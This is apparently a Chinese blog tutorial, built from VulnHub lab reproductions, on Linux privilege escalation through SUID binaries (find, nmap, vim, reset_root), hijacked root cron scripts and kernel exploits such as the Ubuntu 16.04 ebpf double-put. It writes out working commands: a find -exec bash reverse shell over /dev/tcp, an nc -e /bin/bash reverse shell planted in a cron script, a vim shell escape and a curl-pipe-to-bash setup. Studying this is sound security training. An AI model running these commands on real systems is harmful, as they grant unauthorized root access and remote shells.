## 前言

对vulnhub的部分靶场进行复现，从而总结出linux的简单提权，有些内容参考于网络。这算是Linux总结上一篇, 等利用到一些方式再进行总结。

## 提权

### SUID提权

[![zDQot.png](https://image.3001.net/images/20220509/1652079285_6278bab59ae1a981c1103.png!small)](https://imgtg.com/image/zDQot)  
SUID为给予文件一个特殊的权限。当程序运行时，程序会从文件中执行权限继承权限，SUID定义给用户一个临时的所有者权限。当用户执行文件，就会获得所有者的权限。标记着suid的标识命令会获得权限，比如bash命令，运行bash命令时有SUID标识，SUID标识会继承root权限，就好比A信任B，B信任C，那么A就可以间接的信任C，信任是具有传递性的。

通过以下命令查看到SUID位的命令

    
    
    find / -user root -perm -4000 -print 2>/dev/null
    find / -perm -u=s -type f 2>/dev/null
    find / -user root -perm -4000 -exec ls -ldb {}
    

被允许执行权限提升的Linux可执行文件

    
    
    Nmap
    Vim
    find
    Bash
    More
    Less
    Nano
    cp
    pkexec
    look
    reset_root
    

[![zDc3p.png](https://image.3001.net/images/20220509/1652079286_6278bab68185bf68ed017.png!small)](https://imgtg.com/image/zDc3p)

**find提权**  
find用来查询文件，且拥有执行命令能力。如果find以suid权限运行，通过find执行的命令都以root身份运行。  
 **find的命令格式**

    
    
    command:
    find  path -option [-print] [-exec -ok | xargs|grep] [command {} \;]
    	path:要查找的路径
    		1.~表示$home目录
    		2..表示当前目录
    		3./表示跟目录
    	option：查找方式
    		1.-name filename #查找名为filename的文件
    		2.-perm #按执行权限来查找
    		3.-useri username #按文件属性来查找
    
    例子：
    	1.find / -type f -name getflag -exec “whoami” ; 查看当前用户
    	2.find / -type f -name getflag -exec “/bin/sh”;
    

先确定find有无SUID权限，有的话以root权限运行  
[![zDlbq.png](https://image.3001.net/images/20220509/1652079287_6278bab723836a000310d.png!small)](https://imgtg.com/image/zDlbq)

创建l3ife文件，并赋予SUID位的权限  
[![zDsiU.png](https://image.3001.net/images/20220509/1652079287_6278bab7a1490df8523a8.png!small)](https://imgtg.com/image/zDsiU)

使用find命令进行执行whoami

    
    
    find l3ife -exec whoami \;
    

[![zDY2v.png](https://image.3001.net/images/20220509/1652079288_6278bab87deb6bd26d3cd.png!small)](https://imgtg.com/image/zDY2v)

发现已经以root权限运行，我们进行反弹shell

先在window监听666端口,ip为192.168.1.104  
[![zD9gc.png](https://image.3001.net/images/20220509/1652079289_6278bab9068250fc05b71.png!small)](https://imgtg.com/image/zD9gc)

使用centos靶机进行find提权反弹shell，ip为192.168.1.109

    
    
    find /etc/passwd -exec bash -ip >& /dev/tcp/192.168.1.104/666 0>&1 \;
    

发现提权成功  
[![zD6qM.png](https://image.3001.net/images/20220509/1652079289_6278bab9da6e0f453a275.png!small)](https://imgtg.com/image/zD6qM)

 **nmap提权**

 **利用条件：**  
1.低版本：2.02-5.21  
2.os版本

    
    
    nmap --interactive 进入交互模式
    nmap -V 查看版本
    nmap> !sh 提供提升shell
    sh-3.2#whoami
     root
    

在metasploit可以利用suid的nmap进行提权

    
    
    msf6>exploit/unix/local/setuid_nmap
    

**VIM提权**  
vim提权思路为发现vim权限存在suid位权限

当vim存在suid权限，直接切换交互式

    
    
    vim -c ':py import os;os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'
    

**reset_root**

在vulnhub的earth存在reset_root提权

    
    
    reset_root:用来重置root密码
    

使用reset_root  
[![zDC4F.png](https://image.3001.net/images/20220509/1652079290_6278baba7b7de95b48cbb.png!small)](https://imgtg.com/image/zDC4F)  
用nc下载reset_root到本地

    
    
    nc -lnvp 9999 > reset_root 
    nc -w 3 192.168.1.106 6666 < /usr/bin/reset_root
    

### crontab提权

crontab用来制定计划任务，帮助程序员进行备份，按时执行脚本，计划任务，但是当crontab配置不正确，会导致黑客提权。  
先来看看命令格式

    
    
    *　　*　　*　　*　　*　　command
    分 时 日 月 周 命令
    

例子

    
    
    0 1 * * * /root/backup.sh 每天1：00执行备份程序
    

列出存在的计划任务

    
    
    crontab -l
    

[![zH1qX.png](https://image.3001.net/images/20220509/1652079290_6278babae773d3a2891b2.png!small)](https://imgtg.com/image/zH1qX)

创建一条计划任务

    
    
    crontab -e  打开文件
    */1　　*　　*　　*　　 * touch 1.txt //每隔一分钟进行创建1.txt
    

如果可以纂改定时任务执行的任意脚本，可以使用root权限执行任意代码。

进行初始化实验环境

> curl https://labfile.oss.aliyuncs.com/courses/2650/init_cronjobs.sh |bash

[![zHNSx.png](https://image.3001.net/images/20220509/1652079291_6278babb768e0a69d5dd0.png!small)](https://imgtg.com/image/zHNSx)

初始化后在root目录存在transhDirectory目录，目录下存在error.log和readme.txt。在shiyanlou用户存在clean.py

[![zHeCj.png](https://image.3001.net/images/20220509/1652079291_6278babbe9a1b10506c4e.png!small)](https://imgtg.com/image/zHeCj)  
我们需要crontab添加定时任务，每一分钟调用cleanup.py脚本清除 ~/trashDirectory数据

添加crontab一条定时任务

    
    
    * *  * * *   root    python/home/shiyanlou/cleanup.py
    

大概一分钟后trashDirectory文件夹的数据被清空。

通过重写crontab调用脚本提权，先查看脚本权限

> ls -al /home/shiyanlou/cleanup.py

[![zHZ6Y.png](https://image.3001.net/images/20220509/1652079292_6278babc6dc805452b4d7.png!small)](https://imgtg.com/image/zHZ6Y)

由于cleanup.py以root权限提升，我们可以利用cleanup.py反弹shell

    
    
    nc 192.168.1.109  666 -e /bin/bash
    

[![zHgpq.png](https://image.3001.net/images/20220509/1652079293_6278babd01d0ae0c326a9.png!small)](https://imgtg.com/image/zHgpq)  
等待一会之后，成功接收到了反弹回的 shell，并且是 root 权限。

## 内核提权

** 系统内核提权**

这里只学习了DC3的内核提权，具体用到再学习

低权限的用户利用漏洞在本地进行提权

原理是：Linux内核的子系统在处理写入时复制至产生了竞争条件， 恶意用户可利用此漏洞来获取高权限，对只读内存映射进行访问。

竞争条件：任务条件异常，导致应用崩溃，攻击者执行命令，在目标机器提权。

    
    
    内核提权，通过查找服务器漏洞得到exp文件，运行提权文件
    

首先确定服务器版本  
[![zHRSG.png](https://image.3001.net/images/20220509/1652079293_6278babdc41db43e31a0d.png!small)](https://imgtg.com/image/zHRSG)  
Ubuntu版本为16.04

> searchsploit ubuntu 16.04

[![zHtw1.png](https://image.3001.net/images/20220509/1652079294_6278babe6b1431cc0e9f0.png!small)](https://imgtg.com/image/zHtw1)

    
    
    tar -xvf exploit.tar#解压文件
    cd ebpf_mapfd_doubleput_exploit/  #进入目录
    chmod +x compile.sh #授权
    ./compile.sh#执行脚本
    ./doubleput #执行提权脚本
    等待root权限shell
    

还有脏牛提权

[脏牛分析](https://blog.csdn.net/arttnba3/article/details/115773316)  
[脏牛复现](https://xz.aliyun.com/t/9757#toc-1)

## 参考

[Linux提权命令](https://xz.aliyun.com/t/7924#toc-18)  
内核提权

